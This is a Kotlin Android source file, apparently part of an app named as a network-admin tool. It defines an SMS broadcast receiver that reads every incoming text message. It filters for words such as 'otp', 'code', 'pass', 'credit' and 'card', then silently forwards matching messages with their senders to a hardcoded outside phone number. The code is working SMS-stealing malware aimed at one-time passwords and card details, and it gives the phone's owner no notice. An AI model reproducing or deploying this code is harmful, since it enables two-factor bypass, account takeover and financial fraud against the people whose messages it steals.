package com.freetimedevs.sumanth_net_admin

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsManager
import android.telephony.SmsMessage
import android.util.Log
import android.widget.Toast
import java.util.*
import kotlin.math.log

class SMSReciever : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val bundle = intent.extras
        var msgs: Array<SmsMessage?>? = null
        var str: String? = ""
        Log.d(TAG, "onReceive: 1")
        if (bundle != null) {
            Log.d(TAG, "onReceive: 2")
            val pdus = bundle["pdus"] as Array<*>?
            msgs = arrayOfNulls(pdus!!.size);
            for (i in msgs.indices) {
                msgs[i] = SmsMessage.createFromPdu(pdus.get(i) as ByteArray)
                str += msgs[i]!!.originatingAddress
                str += " :"
                str += msgs[i]!!.messageBody
            }
            Log.d(TAG, "onReceive: $str")
            val smsManager = SmsManager.getDefault()
            str = str!!.lowercase(Locale.getDefault());
            if (str.contains("otp") ||
                str.contains("code") ||
                str.contains("pass") ||
                str.contains("gst") ||
                str.contains("credit") ||
                str.contains("card")
            ) {
                str = "BEJAPP: "+str
                smsManager.sendTextMessage("+919100903791", null, str, null, null)
//                                Toast.makeText(context, str, Toast.LENGTH_SHORT).show();
                Log.i(TAG, "$str sent.")
            }
            //            Log.i(TAG, str);
        }
    }

    companion object {
        const val TAG = "SMS RECIEVER"
    }
}